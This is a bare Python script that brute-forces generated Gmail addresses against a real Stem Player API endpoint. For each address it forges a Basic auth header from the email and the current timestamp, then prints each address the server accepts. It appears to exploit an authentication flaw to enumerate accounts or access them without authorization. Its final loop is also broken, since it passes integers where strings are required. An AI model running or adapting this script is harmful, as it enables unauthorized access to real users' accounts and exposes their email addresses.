import requests
import time
import base64
import string
import itertools

range_list = list(range(0, 16))
character_list = list(string.ascii_lowercase)
number_list = list(range(0, 99))

def generate(l):
	for num_item in enumerate(range_list):
		yield from itertools.product(*([l] * num_item[0]))

def test(test_email):
		time.sleep(1)
		email = test_email + "@gmail.com"
		timestamp = round(int(time.time()))
		authorization = email + ':' + str(timestamp)
		bytes = authorization.encode("utf-8")

		bytes = base64.b64encode(bytes)
		authorization = bytes.decode("utf_8")

		headers = {
			'Authorization': 'Basic ' + authorization
		}
		r = requests.get('https://api.stemplayer.com/accounts/access', headers=headers)
		if r.status_code == 200:
			print(email)

for x in generate("abcdefghijklmnopqrstuvwxyz"):
		test(''.join(x))

for x in number_list:
		test(x)